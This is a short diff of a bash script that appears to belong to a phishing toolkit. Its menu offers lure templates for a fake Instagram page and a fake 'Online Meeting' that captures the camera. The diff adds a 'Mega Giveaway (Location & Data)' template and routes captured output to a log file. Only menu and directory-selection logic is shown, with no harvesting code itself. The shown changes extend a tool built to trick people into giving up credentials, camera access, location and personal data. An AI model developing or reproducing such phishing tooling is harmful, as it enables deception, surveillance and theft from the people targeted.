@@ -120,6 +120,8 @@ echo -e "  ${B}[1]${NC} Instagram (Dark UI)"
 
 echo -e "  ${B}[2]${NC} Online Meeting (Camera Capture)"
 
+echo -e "  ${B}[3]${NC} Mega Giveaway (Location & Data)"
+
 read -p "  Selection > " option
 
 
@@ -156,6 +158,11 @@ CAM_DIR="$ROOT_DIR/logs/cam"
 
 echo -e "\n${Y}[*] Loading Meeting template...${NC}"
 
+elif [[ $option == "3" ]]; then
+    TARGET_DIR="$ROOT_DIR/modules/giveaway"
+    LOG_FILE="$ROOT_DIR/logs/output.txt"
+    echo -e "\n${Y}[*] Loading Giveaway template...${NC}"
+    
 else
 
 echo -e "${R}[!] Invalid option${NC}"
